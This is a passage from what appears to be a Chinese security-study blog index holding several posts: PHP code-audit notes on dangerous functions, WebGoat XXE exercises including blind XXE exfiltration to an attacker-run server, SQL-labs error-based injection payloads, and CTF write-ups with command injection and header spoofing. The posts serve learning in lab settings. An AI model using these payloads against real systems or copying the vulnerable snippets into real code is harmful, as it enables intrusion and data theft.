个东西\nUnicode（统一码、万国码、单一码）是一种在计算机上使用的字符编码。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。1990年开始研发，1994年正式公布。\n\n2、HTML实体编码——示例与Unicode相同字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。\n这么做的目的主要有两个：１、解决HTML代码编写中的一些问题。例如需要在网页上显示小于号（&lt;）和大于号（&gt;），由于它们是HTML的预留标签，可能会被误解析。这时就需要将小于号和大于号写成字符实体：小于号这样写：&lt; 或 &lt;大于号这样写：&gt; 或 &gt;前面的写法称为实体名称，后面的写法则是实体编号。ISO-8859-1字符集（西欧语言）中两百多个字符设定了实体名称，而对于其它所有字符都可以用实体编号来代替。２、网页编码采用了特定语言的编码，却需要显示来自其它语言的字符。例如，网页编码采用了西欧语言ISO-8859-1，却要在网页中显示中文，这时必须将中文字符以实体形式写入HTML代码中。\n\n3、16进制Unicode——示例\\u8fd9\\u662f\\u4e00\n\n常用解密网站：\n  ·Unicode：\nwww.sojson.com\n  ·16进制Unicode：\nwww.msxindl.com\n ·HTML字符实体：\nwww.qqxiuzi.cn\n….还有一些引入密钥的非对称型算法，可以看看原文\n","slug":"Encrypted-ciphertext-features","date":"2022-07-21T09:45:54.374Z","categories_index":"网络安全学习","tags_index":"crypto&misc","author_index":"Ttoc"},{"id":"0fbb4ce471f03133d4bc00eb32aefb3b","title":"代码审计知识点记录","content":"代码审计学习的一些笔记\n\n\n代码审计-常见php威胁函数（上）\n\n\n\n\n\n\n\n\n文章来自成都知道创宇\n1.常见php回调函数，可调用其他命令&#x2F;代码执行函数call_user_func()\n\ncall_user_func_array()\n\ncreate_function()\n\narray_walk()\n\narray_map()\n\narray_filter()\n\nusort()\n\nob_start()\n\n可变函数$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;])\n\n\n\n2.常见php可执行系统命令的函数：system()、passthru()、exec()、shell_exec()、 pcntl_exec()、popen()、proc_open()\n3.常见php可代码执行的函数：eval()、assert()、preg_replace()、$\n4.禁用危险函数：php配置文件php.ini里有个disable_functions &#x3D; 配置选项，可自定义禁用某些php危险函数.如:disable_functions &#x3D;system,passthru,shell_exec,exec,popen\n一、可执行php代码的函数&lt;?php eval($_GET[&#x27;cmd&#x27;]); assert($_GET[&#x27;cmd&#x27;]); &lt;?php eval($_GET[&#x27;cmd&#x27;]); assert($_GET[&#x27;cmd&#x27;]); ?>\n\nphp 7.1.7 ，已经无法用call_user_func回调调用 test.php?cmd&#x3D;phpinfo(); preg_replace()  5.6以下可以执行 5.6以上仍然可以执行，但是会有警告 PHP7后已经不支持&#x2F;e修饰符  preg_replace(“&#x2F;test&#x2F;e”,$_GET[“h”],”jutst test”); &#x2F;&#x2F;将jutst  test以&#x2F;test正则匹配以h来替换 &#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码  ?h&#x3D;phpinfo() ${phpinfo()}\n二、常见php回调函数，可调用其他命令&#x2F;代码执行函数：1) call_user_func()call_user_func — 把第一个参数作为回调函数调用, 其余参数是回调函数的参数\n回调函数\ncall_user_func($_GET[&#x27;a1&#x27;],$_GET[&#x27;a2&#x27;]);\n//xxx.php?a1=system&a2=whoami  //命令执行\n//xxx.php?a1=assert&a2=phpinfo()   //代码执行 \n?>\n\n调用类中的函数\n\nerror_reporting(0);\nhighlight_file(__FILE__);\nclass ctfshow\n&#123;\n    function __wakeup()&#123;\n        die(\"private class\");\n    &#125;\n    static function getFlag()&#123;\n        echo file_get_contents(\"flag.php\");\n    &#125;\n&#125;\n\ncall_user_func($_POST[&#x27;ctfshow&#x27;]);\n\n\n\nphp中 ->与:: 调用类中的成员的区别\n\n ->用于动态语境处理某个类的某个实例\n \n ::可以调用一个静态的、不依赖于其他初始化的类方法.\n\n所以这里payload为\nctfshow=ctfshow::getFlag\n\n调用类中的函数【数组】call_user_func()参数不仅可以是字符串，还有 数组形式！\n\ncall_user_func(array($classname, &#x27;say_hello&#x27;));\n调用classname这个类里的sya_hello方法\n\narray[0]=$classname  类名\narray[1]=say_hello   say_hello()方法\n\n\n\n按照上述格式得到payload：\n\nctfshow[]=ctfshow&amp;ctfshow[]=getFlag   #POST\n\n2)call_user_func_array()call_user_func_array()把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入\n\ncall_user_func_array($_GET[&#x27;a1&#x27;],$_GET[&#x27;a2&#x27;]);\n//xxx.php?a1=system&a2[]=whoami\n//xxx.php?a1=assert&a2[]=phpinfo()\n?>\n\n3)create_function()创建匿名函数（Anonymous functions），允许 临时创建一个没有指定名称的函数。最经常用作回调函数（callback）参数的值\n\n$b=create_function(&#x27;&#x27;, @$_REQUEST[&#x27;a&#x27;]);$b();\n//xxx.php?a=phpinfo();\n?>\n\n4) array_walk()array_walk — 使用用户自定义函数对数组中的每个元素做回调处理\n\narray_walk($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;]);\n//xxx.php?a[]=phpinfo()&b=assert\n//xxx.php?a[]=whoami&b=system\n?>\n\n5)array_map()array_map()为数组的每个元素应用回调函数。返回数组，是为 array1 每个元素应用 callback函数之后的数组。callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。\n\narray_map($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;]);\n//xxx.php?a=system&b[]=whoami\n//xxx.php?a=assert&b[]=phpinfo()\n//$array = array(0,1,2,3,4,5);\n//array_map($_GET[&#x27;a&#x27;],$array);\n//.php?a=phpinfo \n?>\n\n6) array_filter()array_filter()用回调函数过滤数组中的单元。依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true， 则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。\n \narray_filter(array($_GET[&#x27;cmd&#x27;]),$_GET[&#x27;func&#x27;]);\n//?func=system&cmd=whoami\n//?func=assert&cmd=phpinfo() \n?>\n\n7) 可变函数$var(args)PHP 支持可变函数的概念。如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数， 并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。\n  \n$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);\n//xxx.php?a=system&b=whoami\n//xxx?a=assert&b=phpinfo()\n?>\n\n8) usort()本函数将用用户自定义的比较函数对一个数组中的值进行排序 php5.6之前可以\n\nusort(...$_GET);\n?>\n\npayload: 1.php?1[0]=0&1[1]=eval($_POST[&#x27;x&#x27;])&2=assert POST传参: x=phpinfo();\n\n9）uasortphp5.6 php7不可以\n\n$a = $_GET[&#x27;a&#x27;];\n$onearray = array(&#x27;Ameng&#x27;, $_POST[&#x27;x&#x27;]);\nuasort($onearray, $a);\n?>\n    \npayload: 1.php?a=assert POST传参: x=phpinfo();\n\n10）ob_startob_start — 打开输出控制缓冲\n \n$foobar = $_GET[&#x27;b&#x27;];\nob_start($foobar);\necho $_GET[&#x27;h&#x27;];\nob_end_flush(); \n?>\n\n/test.php?h=whoami&b=system\n\n三、常见php可执行系统命令的函数：1) system()&lt;?php system($_GET[&#x27;a&#x27;]); &lt;?php system($_GET[&#x27;a&#x27;]); //xxx.php?a=whoami ?>\n\n2) passthru()&lt;?php passthru($_GET[&#x27;a&#x27;]); &lt;?php passthru($_GET[&#x27;a&#x27;]); //xxx.php?a=whoami ?>\n\n3) exec() \n$output = exec($_GET[&#x27;a&#x27;]);\necho \"$output\";\n//xxx.php?a=whoami \n?>\n\n4) shell_exec()\n$output = shell_exec($_GET[&#x27;a&#x27;]);\necho \"$output\";\n//xxx.php?a=whoami \n?>\n\n5) pcntl_exec()要求：linux系统特有模块，需编译选项中存在—enable-pcntl\n&lt;?php pcntl_exec( &quot;/bin/bash&quot; , array(&quot;whoami&quot;)); &lt;?php pcntl_exec( &quot;/bin/bash&quot; , array(&quot;whoami&quot;)); ?>\n\n6) popen()popen — 打开进程文件指针。打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生\npopen — 打开进程文件指针。打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生\n    \n\n$test = $_GET[&#x27;h&#x27;];\n$fp = popen($test,\"r\");  //popen打一个进程通道\nwhile (!feof($fp)) &#123;      //从通道取出内容\n$out = fgets($fp, 4096);\necho  $out;\n&#125;\npclose($fp);\n?>\n\n\n7) proc_open()类似 popen() 函数， 但是 proc_open() 提供了更加强大的控制程序执行的能力\n类似 popen() 函数， 但是 类似 popen() 函数， 但是 proc_open() 提供了更加强大的控制程序执行的能力\n    \n\n$test = \"whoami\";\n$array =   array(\narray(\"pipe\",\"r\"),   //标准输入\narray(\"pipe\",\"w\"),   //标准输出内容\narray(\"pipe\",\"w\")    //标准输出错误\n);\n$fp = proc_open($test,$array,$pipes);   //打开一个进程通道\necho stream_get_contents($pipes[1]);    //为什么是$pipes[1]，因为1是输出内容\nproc_close($fp);\n?>\n\n\n8) 反单引号&lt;?php echo `whoami`; &lt;?php echo `whoami`; ?>\n\n四、文件包含include将会包含语句并执行指定文件 PHP的配置文件allowurlfopen和allow_url_include设置为ON  include&#x2F;require等包含函数可以加载远程文件 include include_once requeire require_once  \n \nhighlight_file(__FILE);\n$file = $_GET[&#x27;file&#x27;];\ninclude $file; \n?>\n\n五、php伪协议【web-study已记】六、文件操作类威胁函数1.file_put_contents\n\n2.file_put_contents($file, $string);\n\n3.copy highlight_file()\n\n4.fopen()\n\n5.read file()\n\n6.fread()\n\n7.fgetss()\n\n8.fgets()\n\n9.parse_ini_file()\n\n10.show_source()\n\n11.file()\n\n","slug":"Code-audit","date":"2022-06-26T14:34:42.604Z","categories_index":"网络安全学习","tags_index":"代码审计","author_index":"Ttoc"},{"id":"03851902a32973532ebe881c76b9c075","title":"线下靶场学习","content":"为什么学习线下靶场，因为线下靶场相比更加容易理解漏洞入门，\n而且可以看到网站的源码，从而可以锻炼代码审计能力，找出漏洞的成因，\n尝试自己提出绕过或者防御的措施，这里只记录一下本人觉得的线下靶场印象深刻，对本人有意义的部分\n\n\nWebGoat一.XXE1.Let’s try前言：在此作业中，您将为照片添加评论，在提交表单时尝试使用评论字段执行 XXE 注入。尝试列出文件系统的根目录。\n\n\n\n\n\n我们先提交评论然后抓包试试\n\n这时我们发现评论的内容是在用xml进行传递，\n可以编写dtd来进行内部实体注入\n&lt;?xml version=&lt;?xml version=\"1.0\"?>\ncomment [\nroot SYSTEM \"file:///C:/\">     \n]>\ncomment> \n        text>\n      &root;\n        text>\ncomment>\n\n\n成功\n2.Modern REST framework前言：在现代 REST 框架中，服务器可能能够接受您作为开发人员没有考虑过的数据格式。因此，这可能会导致 JSON 端点容易受到 XXE 攻击。\n\n再次进行相同的练习，但尝试执行与我们在第一个作业中所做的相同的 XML 注入。\n\n\n\n\n\n这个明显发现底下的评论传递格式不再是xml\n而是在用json进行传递\njson：\n是一种轻量级的数据交换格式。人类很容易阅读和写作。机器很容易解析和生成。它基于 JavaScript 编程语言标准\n\n在 JSON 中，它们采用以下形式：\n\n对象是一组无序的名称/值对。一个对象以&#123;（左大括号）开始，以&#125;（右大括号）结束。每个名称后跟：冒号，名称/值对由逗号分隔。\n\n\n这里我们看\n\n就知道是修改 Content-Type\n\n我们直接把\nContent-Type: application/json\n改成\nContent-Type: application/xml\n\n那就可以以 xml 形式上传评论，从而实现 xxe 注入\n&lt;?xml version=&lt;?xml version=\"1.0\"?>\ncomment [\nroot SYSTEM \"file:///C:/\">     \n]>\ncomment> \n        text>\n      &root;\n        text>\ncomment>\n\n\n成功\n3.Blind XXE assignment前言：在本作业中尝试制作一个 DTD，它将文件 secret.txt 的内容从 WebGoat 服务器上传到我们的 WebWolf 服务器。您可以使用 WebWolf 为您的 DTD 提供服务。secret.txt 位于此位置的 WebGoat 服务器上，因此您无需扫描所有目录和文件：\n\n你\t                 地点\nWindows 10            C:\\Users\\Ttoc/.webgoat-8.2.2//XXE/secret.txt\n\n尝试使用 WebWolf 登录页面上传此文件，例如：（ 注意：此端点由您完全控制）一旦您获得文件的内容，将其作为新评论发布在页面上，您将解决课程。http://127.0.0.1:9090/landing\n\n\n\n\n\n盲注就是没有回显内容，但是我们需要把我们目标服务器的敏感文件内容获取到我们的服务器\n简而言之，\n\nwebgoat开启了站点，这个站点有XXE，webgoat服务器上有个密码文件，通过XXE把这个密码文件读取，并且发送到我们自己的恶意站点webwolf，webwolf接受到这个请求就顺理成章获取了密码文件里面的密码\n\n\n\n这里主要利用xml通过DTD实现文件包含，\n先把我们自己写的DTD文件包含在我们的服务器webwolf，然后在webgoat上通过xxe进行远程包含我们站点的这个DTD文件，然后webgoat在解析我们的DTD文件的时候就会把secret.txt文件内容赋值到文件并作为参数发送到我们的webwolf服务器\n\n我们先发送评论看看\n这里发送的是空内容，回显的内容看来是提示，\n需要我们先在`webwolf`上上传文件\n\n\n我们先抓包看看webgoat的评论的解析格式是怎么样的\n\n看来是正常的xml解析\n我们先在webwolf上上传我们的evil.dtd文件\n\">\n\n\n//声明变量 write 并嵌套赋值\n\n为什么还要用一个参数实体嵌套呢？\n因为如果我们用一个write参数实体将send外部实体的定义写进请求中，在%write;执行的过程中，%file也会被替换成相应的文本。因此最后，?text后面的值就是我们想要的内容\n\n\n这里的变量赋值和前面的不同\n它是\n%（空格）变量名\n这种命名的方式的变量只能在DTD里用，而在xml里用不了\n\n\n上传成功后我们在incoming requests里看到上传路径，这样在webgoat就调用访问包含就行了\n\n然后我们再在webgoat抓包数据里构造我们的payload\n\n\n//这个路径是有这个文件，因为在执行jar文件的时候，自动生成了这个文件\n\n//注意这里是上传路径，要写自己的\n%getdtd; \n%write;\n//在%getdtd;后面调用%write;\n]>\n\n    \n     &send; \n     //再调用%write里的&send变量，这个变量是再嵌套的DTD语句中声明，所以需要在xml里调用\n    \n\n\n\n虽然提示是报错，但是我们到我们的webwolf上查看\n\n\n这个是secret.txt的值，我们看看webwolf上有没有获得该数据\n\n\n成功获取\n\n成功\nSQL-labs这里不全写，详细建议找一下sql-labs天书，认真学习一下\nless-17其实我们可以先在源代码中看到一个函数。check_input()函数。 就会了解为什么不在username处进行注入\n\n\n这里把这几个函数解释一下，就清楚了\n★addslashes()\naddslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 \n\n预定义字符是： \n\n​单引号（&#x27;） \n\n​双引号（\"） \n\n​反斜杠（\\） \n\n​NULL \n\n提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。 \n\n注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您 \n\n不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可 \n\n以使用函数 get_magic_quotes_gpc() 进行检测。 \n\n\n\n\n\n语法：addslashes(string) \n\n参数             描述\n\nstring          必需。规定要转义的字符串。 \n\n返回值：         返回已转义的字符串。 \n\nPHP 版本：       4+\n\n★stripslashes() \n函数删除由 addslashes() 函数添加的反斜杠。\n\n★mysql_real_escape_string()\n函数转义 SQL 语句中使用的字符串中的特殊字符。\n\n下列字符受影响： \n\\x00 \n\n\\n \n\n\\r \n\n\\ \n\n&#x27; \n\n\" \n\n\\x1a\n\n如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。 \n语法：mysql_real_escape_string(string,connection) \n\n参数                              描述 \n\nstring                            必需。规定要转义的字符串。 \n\nconnection 可选。    规定 MySQL 连接。如果未规定，则使用上一个连接\n\n所以注入处应该在passwd中\n开始先尝试注入，发现没有回显，\n所以试试报错注入\n1&#39;and updatexml(1,concat(0x7e,(select password from users),0x7e),1)#\n报出You can&#39;t specify target table &#39;users&#39; for update in FROM clause\n\n大致意思是，在同一语句中，不能先select出同一表中的某些值，再update这个表\n所以这里就需要加一个中间表，就可以绕过这个错误\n比如\n1&#39;and updatexml(1,concat(0x7e,(select password from (select password from users)a),0x7e),1)#\n这里就是把(select password from users)的查询后的数据存入生成的新表a，然后就相当于(select password from a)\n\n发现不能超过一行\n于是用\n1&#39;and updatexml(1,concat(0x7e,(select group_concat(password) from (select password from users)a),0x7e),1)#\n成功\n\nDVWA推荐文章链接\n不要只知道payload，要仔细分析理解源码，找出出现漏洞的原因点\n建议看推荐文章，下面代码审计和题目分析仅是我个人能力结果，只能尽可能说到点处\n而且部分也是借鉴推荐文章内容\nUpload-labs建议看文章，最后几关二次渲染和条件竞争建议仔细学习一下\n","slug":"underline-learning","date":"2022-06-21T14:06:24.391Z","categories_index":"网络安全学习","tags_index":"靶场","author_index":"Ttoc"},{"id":"c1355e18e08f584a9698a2879b69aeba","title":"攻防世界靶场wp","content":"这个线上靶场感觉很适合入门，而且难度分布也好，很优秀的线上靶场，非常值得仔细学习研究一下\n...功防世界突然改版了，把题弄成一堆了，不过还是有难度系数，不过也方便看看有哪些适合难度的题目做一做\n\n\nWeb新手1.view_source1)题目描述X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了\n2)wp右键不管用，直接用F12查看\n得到flag\n2.robots1)题目描述X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧\n2)wp不清楚robots协议是什么，于是我百度了一下，\nrobots协议也称爬虫协议、爬虫规则等,是指网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取\n也就是说网站下有一个robots.txt文件，规定了页面抓取规则，于是我们尝试访问http://111.200.241.244:54251/robots.txt\n界面显示如下\n\ndisallow就是不允许抓取的页面，看到flag，就知道我们就要访问这个文件，于是访问http://111.200.241.244:54251/f1ag_1s_h3re.php\n得到flag\n3.backup1)题目描述X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！\n2)wp看到找文件，首先我就想用dirsearch扫一扫\n打开靶场先看到\n\n于是我先扫一扫，看一看有没有 index.php文件的文件名\n\n扫完后发现index.php.bak文件，很明显它就是备份文件，我们尝试直接访问它一下http://111.200.241.244:52824/index.php.bak\n自动下载好了index.php.bak，用文本打开\n得到flag\n4.cookie1)题目描述X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：这是夹心饼干的意思吗？\n2）wp我的日常随记第一章大概讲了cookie的作用和含义，该题可以不了解也可以完成\n目前我看cookie的有两个方法，一个是burpsuite抓包看，另一个就是用火狐插件Tamper Data，这里我用brup\n我们先用burpsuite抓一个包看看\n\n发现cookie处提示有个cookie.php文件，访问http://111.200.241.244:49599/cookie.php看看，如下\n\n于是我们把抓包数据发到repeater里看看response\n得到flag\n5.disabled_button1)题目描述X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？\n2)wp该题说按这个按钮不能按，那么为什么不能按，看看源码\n\n看到有个disabled，就是它使得按钮无法被按，所以删去就可以\n打开开发者工具，在查看器里面，把disabled语句删去\n按钮就可以按了，点击\n得到flag\n6.weak_auth1)题目描述小宁写了一个登陆验证页面，随手就设了一个密码。\n2)wp开始我们先随便输入用户名和密码，弹窗显示\n\n于是我们知道用户名是  admin，但是密码不知道，只知道是随手输入的，我们试试burp抓包看看有没有提示\n在response里看到\n\n这里我们就知道要用burp的密码爆破，具体操作就不细讲，随记有写\n这是部分密码txt的网站，可以下载使用，针对不同环境，用不同密码文本\nhttps://www.somd5.com/download/dict/\n最后爆出密码123456,以用户 admin输入登录\n得到flag\n7.simple_php1)题目描述小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。\n2)wp先进行代码分析\n \nshow_source(__FILE__); \ninclude(\"config.php\"); \n$a=@$_GET[&#x27;a&#x27;]; \n$b=@$_GET[&#x27;b&#x27;]; \nif($a==0 and $a)&#123;   echo $flag1; \n&#125; if(is_numeric($b))&#123;\nexit(); &#125; \nif($b>1234)&#123;   \necho $flag2; &#125; \n?>\n\n可以看到flag被分成了两个部分，一个flag1，一个 flag2\na,b两个变量以get型输入\n第一个if要求a&#x3D;&#x3D;0且a为ture，这明显矛盾，当a&#x3D;0就代表a为false\n所以这里涉及了php性质，php属于一门弱类型语言\n弱类型：不必向 PHP 声明该变量的数据类型，PHP 会根据变量的值，自动把变量转换为正确的数据类型\n所以当在第一个if判断a的值时，a可以利用弱类型性质，a&#x3D;0A，当进行a&#x3D;&#x3D;0判断时，会自动把a当作数字型，也就是把a&#x3D;0A后的A去掉，从而成立；\n而当判断a是否为ture时，由于a&#x3D;0A而非0，所以结果为ture，输出flag1\n这里思考一下，如果是 if( $a===0 and $a )&#123; echo $flag1; &#125;，那按上面对a赋值还可以吗？\n这里涉及php类型比较&#x3D;&#x3D;与&#x3D;&#x3D;&#x3D;的区别\n\n松散比较：使用两个等号 &#x3D;&#x3D; 比较，只比较值，不比较类型。\n严格比较：用三个等号 &#x3D;&#x3D;&#x3D; 比较，除了比较值，也比较类型。\n\n上面代码中&#x3D;&#x3D;对类型不比较，所以a&#x3D;0A与0比较时，可当作a&#x3D;0与0比较\n但是当为&#x3D;&#x3D;&#x3D;时，a&#x3D;0A不属于数字型，所以当if(a&#x3D;&#x3D;&#x3D;0)返回false，从而返回false\n第二个if看到，is_numeric($b)，这里要了解一下is_numereic()函数的作用\nis_numeric()函数：用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE\n也就是说b的值不能为数字和数字串，但是第三个if要求b&gt;1234，所以b要为数字\n这个和a一样，利用了php的弱类型性质，既然不能为数字，那b&#x3D;1235B，这样当b与1234比较时，b转化为数字型，去掉B，1235&gt;1234成立，输出flag2\n于是payload为\nhttp://111.200.241.244:51156/?a=0A&amp;b=1235B\n得到flag\n8.get_post1)题目描述X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？\n2）wpGet和Post方式是HTTP通常使用两种请求方法\nGet方式直接在url输入?a&#x3D;1\nhttp://111.200.241.244:52081/?a=1\nPost方式利用火狐插件HackerBar以post方式b&#x3D;2\nrun\n\n得到flag\n9.xff_referer1)题目描述X老师告诉小宁其实xff和referer是可以伪造的\n2)wp先了解什么是xxf和referer\n（1）X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP  代理或者负载均衡服务器时才会添加该项。xff是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP\n（2）HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。referer  是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。\n抓包后，发现并没有X-Forwarded-For和Referer，加上即可\n\n看题界面，提示ip必须为123.123.123.123，于是在抓包数据里加上\nX-Forwarded-For： 123.123.123.123\n\nsend数据后，发现response里出现以下数据，也就是说还有声明是从谷歌界面过来的\n\n也就是还要加上\nReferer:  https://www.google.com\n最后如下\n\nsend到response后\n得到 flag\n10.webshell1)题目描述小宁百度了php一句话,觉着很有意思,并且把它放在index.php里\n2)wp看到这句代码我一下想到一句话木马，标题webshell也提示这个木马题，根据描述我们知道这个木马在index.php里\n不了解的可以看看这篇文章\nphp一句话木马\n\n用蚁剑连接即可，这里对蚁剑使用方法不赘述，建议自己操作学习\n得到flag\n11.command_execution1)题目描述小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。\n2)wp根据题目名知道这是命令执行漏洞的题，可以先了解一下命令执行的知识\n先用自己的IP试一下\n120.0.0.1\n\n得到以下数据，由此可知我们上传的命令是ping -c 3 + 输入的语句，所以需要用到管道符\n此处不止可以用 |，了解了其他管道符的作用，也可以达到相同的效果\n\n在利用管道符，在当前目录及其子目录查找有没有名为flag.txt的文件\n120.0.0.1 | find  / -name flag.txt\n\n得到flag.txt的位置的绝对路径\n输出打印flag,txt\n120.0.0.1 | cat /home/flag.txt\n得到flag\n12.simple_js1）题目描述小宁发现了一个网页，但却一直输不对密码。\n(Flag格式为 Cyberpeace{xxxxxxxxx} )\n2）wp该题涉及代码审计，看起有点难度，但说实话大部分内容与代码审计无关，但可以分析一下\n开始界面弹窗输入密码\n\n输入错误，提示FAUX PASSWORD HAHA\n\n我们F12把它源码拿出来分析一下\n&lt;&lt;html>\n    head>\n    title>JStitle>\n    script type=\"text/javascript\">\n    function dechiffre(pass_enc)&#123;\n        var pass = \"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\";\n        var tab  = pass_enc.split(&#x27;,&#x27;);\n        var tab2 = pass.split(&#x27;,&#x27;);\n        var i,j,k,l=0,m,n,o,p = \"\";\n        i = 0;\n        j = tab.length;\n        k = j + (l) + (n=0);\n        n = tab2.length;\n        for(i = (o=0); i \n    &#123;o = tab[i-l];p += String.fromCharCode((o = tab2[i]));\n                    if(i == 5)break;&#125;\n               for(i = (o=0); i \n               &#123;\n                   o = tab[i-l];\n                   if(i > 5 && i 1)\n                   p += String.fromCharCode((o = tab2[i]));\n               &#125;\n        p += String.fromCharCode(tab2[17]);\n        pass = p;return pass;\n    &#125;\n    String[\"fromCharCode\"](dechiffre(\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"));\n\n    h = window.prompt(&#x27;Enter password&#x27;);\n    alert( dechiffre(h) );\n\n   script>\n    head>\nhtml>\n\n\n我们看到开头一大串代码先不着急，挨个分析\n最显眼的就是这串16进制码\n\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\n我们可以先用python 直接输出，得到10进制\n\n这里我们把这串10进制数按ascii码转化为字符串\n786OsErtk12\n按描述填写 \n得到flag : Cyberpeace{786OsErtk12}\n\n我对代码审计还不太熟悉，下面引用一篇大佬的代码审计\nhttps://blog.csdn.net/qq_41617034/article/details/91490695\n执行流程：\n一、首先定义了一个dechiffre函数，咱先不管，因为还没有调用\n注：先将\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30十六进制数转换成字符串，python下print即可，或网址：https://www.bejson.com/convert/ox2str/\n输出结果55,56,54,79,115,69,114,116,107,49,50\n\n二、执行String[\"fromCharCode\"](dechiffre(\"55,56,54,79,115,69,114,116,107,49,50\n\"));\n\n三、调用了dechiffre，执行dechiffre函数\nString[\"fromCharCode\"](dechiffre(\"55,56,54,79,115,69,114,116,107,49,50\n\"));\n(1)先将\"55,56,54,79,115,69,114,116,107,49,50\n\"带入dechiffre函数执行，即dechiffre(pass_enc)=dechiffre(\"55,56,54,79,115,69,114,116,107,49,50\n\")\n\n(2)接着我们看到了pass变量，暂时先放着\n\n(3)因为pass_enc=\"55,56,54,79,115,69,114,116,107,49,50\"\n将pass_enc字符串分割成字符串数组，赋值给tab参数，所以：\ntab=[55,56,54,79,115,69,114,116,107,49,50]   注：tab此时是字符串数组！！！\n\n(3)随后也对pass分割\ntab2=[70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65]\n\n(4)变量赋值代码分析：var i,j,k,l=0,m,n,o,p = \"\";i = 0;j = tab.length;\n一开始i,j,k,m,n,o,没有赋值，为undefined，其它参数l=0，p=\"\"，后来i被赋值=0，j被赋值为11\n\n(5)第九行此时n被赋值为0，所以k=11+0+0，最后等于11    注：这里的(l)其中是英文字母l，不是数字1\n\n(6)第十行中，n=18\n\n(7)第一个for循环，精简一下代码：\nfor(i = 0; i o=70;p=\"\"+String.fromCharCode(70)=>p=英文字母F\n第二次...\n第三次...\n第四次...\n第五次...\n所以，这个for循环，最后的p为（尽管没有输出出来，这里我们知道就好）FAUX P\n\n(8)第二个for循环，精简一下代码：\nfor(i = 0; i  5 && i \n\n\n\n\n\n\n    var n=String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50);\n    document.write(n);\n\n\n\n最后结果为：786OsErtk12\n根据提示的flag格式输入最后的flag！\n\n注：\n(1)split() 方法用于把一个字符串分割成字符串数组\n语法：string.split(separator,limit)\n参数                 描述\nseparator        可选。字符串或正则表达式，从该参数指定的地方分割 string Object。比如此题以逗号分割成字符串数组\nlimit            可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。\n举例：str=\"a,b,c,d,e,f,g\";\nvar 1st = str.split(\",\",3);   对str以逗号进行分割，分割后的字符串数组内的值最多只能有3个，结果就是1st = [a,b,c]\n\n(2)for 循环的语法如下：\nfor (语句 1; 语句 2; 语句 3) &#123;\n     要执行的代码块\n&#125;\n语句 1 在循环（代码块）开始之前执行。\n语句 2 定义运行循环（代码块）的条件。\n语句 3 会在循环（代码块）每次被执行后执行。\n\n(3)fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。\n语法：String.fromCharCode(n1, n2, ..., nX)\n参数                 描述\nn1, n2, ..., nX     